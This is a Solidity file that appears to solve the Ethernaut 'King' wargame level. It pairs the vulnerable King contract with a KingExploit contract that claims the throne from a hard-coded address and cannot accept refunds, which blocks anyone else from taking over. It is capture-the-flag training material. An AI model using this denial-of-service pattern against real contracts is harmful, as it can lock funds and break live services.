//SPDX-License-Identifier: MIT

pragma solidity ^0.8.17;

contract King {
    address king;
    uint256 public prize;
    address public owner;

    constructor() payable {
        owner = msg.sender;
        king = msg.sender;
        prize = msg.value;
    }

    receive() external payable {
        require(msg.value >= prize || msg.sender == owner);
        payable(king).transfer(msg.value);
        king = msg.sender;
        prize = msg.value;
    }

    function _king() public view returns (address) {
        return king;
    }
}

contract KingExploit {
    King king = King(payable(0x50a0BccBb91026d20Ae1eFE299b2216B79b28f5E));

    constructor() payable {
        (bool sent, ) = address(king).call{value: 1000000000000000}("");
        require(sent, "Failed to send value!");
    }
}

/*  function sendEther() public payable {
        }
    }*/
